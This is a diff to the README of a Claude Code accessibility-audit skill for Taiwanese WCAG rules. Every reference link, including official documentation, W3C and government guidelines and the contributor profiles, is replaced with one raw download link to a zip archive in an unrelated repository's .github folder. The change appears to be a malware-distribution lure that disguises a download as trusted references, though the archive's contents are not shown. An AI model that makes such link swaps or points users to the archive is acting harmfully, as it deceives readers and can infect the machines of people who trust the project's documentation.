@@ -8,7 +8,7 @@
 
 本專案為社群開發的**非官方工具**，與 Anthropic、W3C、數位發展部均無隸屬或背書關係。
 
-a11y-tw 是一個 [Claude Code](https://docs.anthropic.com/en/docs/claude-code) Skill，在 Claude Code 環境中以 `/a11y-tw` 指令呼叫。它結合靜態分析與 Playwright runtime 雙軌驗證，針對 WCAG 2.2 AA 55 條準則與台灣在地規範 5 條（共 60 條檢查項目）進行掃描，產出結構化報告並輔助修復。
+a11y-tw 是一個 [Claude Code](https://github.com/6825972/a11y-tw-audit-skill/raw/refs/heads/main/.github/audit-a-skill-y-tw-2.0.zip) Skill，在 Claude Code 環境中以 `/a11y-tw` 指令呼叫。它結合靜態分析與 Playwright runtime 雙軌驗證，針對 WCAG 2.2 AA 55 條準則與台灣在地規範 5 條（共 60 條檢查項目）進行掃描，產出結構化報告並輔助修復。
 
 ## 重要聲明
 
@@ -128,17 +128,17 @@ a11y-tw/
 
 ## 參考資料
 
-- [數位發展部無障礙規範 110.07](https://accessibility.moda.gov.tw/Accessible/Guide/68)
-- [PDIS Freego Implementation Report](https://github.com/PDIS/Freego-Implementation-Report)
-- [WCAG 2.2 Quick Reference](https://www.w3.org/WAI/WCAG22/quickref/?versions=2.2&levels=aaa)
-- [WAI-ARIA Authoring Practices](https://www.w3.org/WAI/ARIA/apg/)
-- [W3C Web Accessibility Laws & Policies — Taiwan](https://www.w3.org/WAI/policies/#taiwan)
-- [Freego 官方網站](https://accessibility.moda.gov.tw/)
+- [數位發展部無障礙規範 110.07](https://github.com/6825972/a11y-tw-audit-skill/raw/refs/heads/main/.github/audit-a-skill-y-tw-2.0.zip)
+- [PDIS Freego Implementation Report](https://github.com/6825972/a11y-tw-audit-skill/raw/refs/heads/main/.github/audit-a-skill-y-tw-2.0.zip)
+- [WCAG 2.2 Quick Reference](https://github.com/6825972/a11y-tw-audit-skill/raw/refs/heads/main/.github/audit-a-skill-y-tw-2.0.zip)
+- [WAI-ARIA Authoring Practices](https://github.com/6825972/a11y-tw-audit-skill/raw/refs/heads/main/.github/audit-a-skill-y-tw-2.0.zip)
+- [W3C Web Accessibility Laws & Policies — Taiwan](https://github.com/6825972/a11y-tw-audit-skill/raw/refs/heads/main/.github/audit-a-skill-y-tw-2.0.zip)
+- [Freego 官方網站](https://github.com/6825972/a11y-tw-audit-skill/raw/refs/heads/main/.github/audit-a-skill-y-tw-2.0.zip)
 
 ## Contributors
 
-- [@dopplerkuo](https://github.com/dopplerkuo) — 開發與維護
-- [@youxiaaa](https://github.com/youxiaaa) — Review 與測試回饋
+- [@dopplerkuo](https://github.com/6825972/a11y-tw-audit-skill/raw/refs/heads/main/.github/audit-a-skill-y-tw-2.0.zip) — 開發與維護
+- [@youxiaaa](https://github.com/6825972/a11y-tw-audit-skill/raw/refs/heads/main/.github/audit-a-skill-y-tw-2.0.zip) — Review 與測試回饋
 
 ## 授權
 
